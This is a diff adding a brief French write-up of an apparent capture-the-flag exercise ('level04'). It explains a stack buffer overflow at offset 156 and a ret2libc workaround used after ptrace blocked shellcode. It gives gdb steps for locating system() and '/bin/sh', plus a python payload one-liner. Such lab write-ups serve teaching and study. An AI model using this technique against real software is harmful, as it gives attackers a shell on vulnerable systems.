@@ -1,0 +1,19 @@
+Nous avons trouver que le buffer s'overflow à l'offset 156,
+nous avons tout d'abord commencer à mettre un shellcode dans les variables d'env
+puis pris l'adresse et l'avoir mis sur l'offset MAIS ptrace nous bloque
+
+Alors nous avons utilisé la fonction system et la chaine "/bin/sh"
+
+pour trouver l'adresse de la fonction system
+
+gdb level04 -> print system (nous obtenons son adresse)
+
+pour trouver l'adresse de la chaine "/bin/sh" c'est un peu plus tricky
+
+gdb level04 -> info proc map -> find StartAddr,EndAddr,"/bin/sh"
+
+une fois obtenu nous pouvons mettre en place notre exploit
+
+python -c 'print "A" * offset + "AddrSystem" + "4444" + "AddrString"' > test
+
+nous avons 4 offset garbage entre l'AddrSystem et AddrString
